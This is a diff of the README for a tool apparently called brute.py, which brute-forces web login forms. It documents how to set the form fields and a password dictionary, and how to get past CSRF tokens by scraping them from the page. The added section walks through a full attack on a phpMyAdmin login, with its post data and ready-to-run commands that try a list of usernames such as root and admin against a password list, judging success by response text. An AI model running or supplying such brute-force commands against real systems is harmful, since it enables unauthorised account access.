@@ -26,15 +26,15 @@ you need to provide necessary details and then ready to go.**
 **help** -> Display help
 
 **url** -> Set target url for submission post request
-### example: `python brute.py url='http://exmpl.cm/lg.php'` 
+example: `python brute.py url='http://exmpl.cm/lg.php'` 
 
 **username** -> Set username details with HTML form name and its value
-### example: `<input type="text" value="site_admin" name="pg_user">`
+example: `<input type="text" value="site_admin" name="pg_user">`
 
 then: `python brute.py username='pg_user=site_admin'`
 
 **password** -> Set dictionary file
-### example: `<input type="password" value="" name="pg_passwd">`
+example: `<input type="password" value="" name="pg_passwd">`
 
 Dict file: `./lsts/passwords.lst`
 
@@ -45,7 +45,7 @@ Some login forms are protected with some CSRF TOKENS.
 Web page generates token injects in login page and excepts this value for next login request.
 If it isn't there or is incorrect value then server blocks our requests.
 But we can bypass it by specifying csrf-token-name and csrf-selector
-### example: <input type="hidden" value="GFHKJ4576jhasldL:IUGBVCRTU" name="cstf_hid_token">`
+example: <input type="hidden" value="GFHKJ4576jhasldL:IUGBVCRTU" name="cstf_hid_token">`
 then: `csrf-token-name='cstf_hid_token'`
 And `csrf-selector` is `document.querySelector` syntax in order to find this value inside response HTML and send it back.
 
@@ -86,16 +86,44 @@ Like: **Wrong**, **Incorrect login** and etc.
 HTML form: 
 ```
  <form method="post" action="index.php" name="login_form" class="disableAjax login hide js-show">
-        <fieldset>
-        <legend>Log in<a href="./doc/html/index.html" target="documentation"><img src="themes/dot.gif" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a></legend><div class="item">
-                <label for="input_username">Username:</label>
-                <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
-            </div>
-            <div class="item">
-                <label for="input_password">Password:</label>
-                <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
-            </div>    <input type="hidden" name="server" value="1" /></fieldset>
-        <fieldset class="tblFooters">
-            <input value="Go" type="submit" id="input_go" /><input type="hidden" name="target" value="index.php" /><input type="hidden" name="token" value="4d604030d09328d67c268585d47134b9" /></fieldset>
+    <fieldset>
+    	<legend>Log in<a href="./doc/html/index.html" target="documentation"><img src="themes/dot.gif" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a>
+        </legend>
+        <div class="item">
+            <label for="input_username">Username:</label>
+            <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
+        </div>
+        <div class="item">
+            <label for="input_password">Password:</label>
+            <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
+        </div>
+        <input type="hidden" name="server" value="1" />
+    </fieldset>
+    <fieldset class="tblFooters">
+        <input value="Go" type="submit" id="input_go" />
+        <input type="hidden" name="target" value="index.php" />
+        <input type="hidden" name="token" value="4d604030d09328d67c268585d47134b9" />
+    </fieldset>
     </form>
 ```
+
+Post data:
+```
+pma_username=root&pma_password=blahblah&server=1&target=index.php&token=4d604030d09328d67c268585d47134b9
+```
+*token* is CSRF protection 
+
+Displays Error : `Access denied for user` which is only if authentication fails
+
+Our Code for Brute-forcing is:
+
+```
+python brute.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,nimda,ttu' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' not-content-text='Access denied for user'
+```
+<img src="./img/1.png">
+
+
+```
+python brute.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,ttu,nimda' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' content-text='information_schema' progress-bar
+```
+<img src="./img/2.png">
